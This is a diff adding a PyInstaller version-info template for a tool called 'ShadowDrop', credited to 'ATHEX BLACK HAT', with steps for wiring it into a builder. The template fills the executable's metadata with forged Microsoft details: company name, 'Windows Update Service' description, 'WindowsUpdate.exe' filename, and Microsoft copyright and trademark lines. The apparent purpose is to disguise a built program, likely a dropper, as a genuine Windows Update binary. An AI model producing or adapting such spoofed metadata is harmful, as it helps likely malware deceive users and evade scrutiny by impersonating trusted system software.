@@ -1,0 +1,75 @@
+# ============================================================
+#  PyInstaller Version Info Template
+#  ShadowDrop - Security Edition
+#  Developer : ATHEX BLACK HAT
+#  Version   : 1.0.0
+# ============================================================
+#
+#  USAGE:
+#      1. Copy this file -> version_mylab.txt
+#      2. Edit values below
+#      3. In builder config (JSON):
+#           "VERSION_FILE": "assets/version_info/version_mylab.txt"
+#      4. PyInstaller flag:
+#           --version-file assets/version_info/version_mylab.txt
+#
+#  NOTE:
+#      - File must be UTF-8 encoded
+#      - Strings use single quotes
+#      - Translation: 1033 = English (US), 1200 = Unicode
+# ============================================================
+
+VSVersionInfo(
+  ffi=FixedFileInfo(
+    # filevers / prodvers format: (major, minor, patch, build)
+    # Example Windows 10 build:
+    filevers=(10, 0, 19041, 1),
+    prodvers=(10, 0, 19041, 1),
+
+    # Mask: 0x3f = all fields valid
+    mask=0x3f,
+    flags=0x0,
+
+    # OS: 0x40004 = VOS_NT_WINDOWS32
+    OS=0x40004,
+
+    # File type: 0x1 = VFT_APP (application)
+    fileType=0x1,
+
+    # Subtype: 0x0 = VFT2_UNKNOWN
+    subtype=0x0,
+
+    # Date: (0,0) = no timestamp
+    date=(0, 0)
+  ),
+
+  kids=[
+    StringFileInfo(
+      [
+        StringTable(
+          '040904B0',   # 0409 = English (US), 04B0 = Unicode
+          [
+            StringStruct('CompanyName',      'Microsoft Corporation'),
+            StringStruct('FileDescription',  'Windows Update Service'),
+            StringStruct('FileVersion',      '10.0.19041.1'),
+            StringStruct('InternalName',     'WindowsUpdate'),
+            StringStruct('LegalCopyright',   '© Microsoft Corporation. All rights reserved.'),
+            StringStruct('OriginalFilename', 'WindowsUpdate.exe'),
+            StringStruct('ProductName',      'Microsoft® Windows® Operating System'),
+            StringStruct('ProductVersion',   '10.0.19041.1'),
+            StringStruct('Comments',         'Windows Update Service'),
+            StringStruct('LegalTrademarks',  'Microsoft® is a registered trademark'),
+            StringStruct('PrivateBuild',     ''),
+            StringStruct('SpecialBuild',     ''),
+          ]
+        )
+      ]
+    ),
+
+    VarFileInfo(
+      [
+        VarStruct('Translation', [1033, 1200])
+      ]
+    )
+  ]
+)
